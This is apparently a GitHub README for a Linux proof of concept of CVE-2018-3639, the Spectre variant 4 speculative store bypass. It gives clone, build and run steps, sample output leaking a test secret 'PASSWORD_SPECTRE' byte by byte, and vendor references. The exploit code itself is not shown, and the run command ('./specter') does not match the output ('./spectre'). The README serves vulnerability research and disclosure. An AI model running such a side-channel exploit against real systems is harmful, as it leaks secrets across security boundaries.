# CVE-2018-3639
Speculative Store Bypass (CVE-2018-3639) proof of concept for Linux

## Download
```sh
git clone git@github.com:mmxsrup/CVE-2018-3639.git
```

## Build
```sh
cd CVE-2018-3639
make
```

## Run
```sh
./specter
```

## Output
```txt
$ ./spectre 
idx: 0, highest:P, hitrate:21.340000
idx: 1, highest:A, hitrate:15.520000
idx: 2, highest:S, hitrate:13.600000
idx: 3, highest:S, hitrate:18.650000
idx: 4, highest:W, hitrate:19.860000
idx: 5, highest:O, hitrate:15.350000
idx: 6, highest:R, hitrate:17.470000
idx: 7, highest:D, hitrate:18.680000
idx: 8, highest:_, hitrate:15.580000
idx: 9, highest:S, hitrate:14.480000
idx:10, highest:P, hitrate:17.870000
idx:11, highest:E, hitrate:13.300000
idx:12, highest:C, hitrate:14.360000
idx:13, highest:T, hitrate:18.030000
idx:14, highest:R, hitrate:18.460000
idx:15, highest:E, hitrate:13.230000
PASSWORD_SPECTRE
```

## References
- [speculative execution, variant 4: speculative store bypass](https://bugs.chromium.org/p/project-zero/issues/detail?id=1528)  
- [Analysis and mitigation of speculative store bypass (CVE-2018-3639)](https://blogs.technet.microsoft.com/srd/2018/05/21/analysis-and-mitigation-of-speculative-store-bypass-cve-2018-3639/)  
- [Kernel Side-Channel Attack using Speculative Store Bypass - CVE-2018-3639](https://access.redhat.com/security/vulnerabilities/ssbd)  
- [Spectre V4: Store-Load Vulnerability](https://www.cyberus-technology.de/posts/2018-05-22-intel-store-load-spectre-vulnerability.html)  
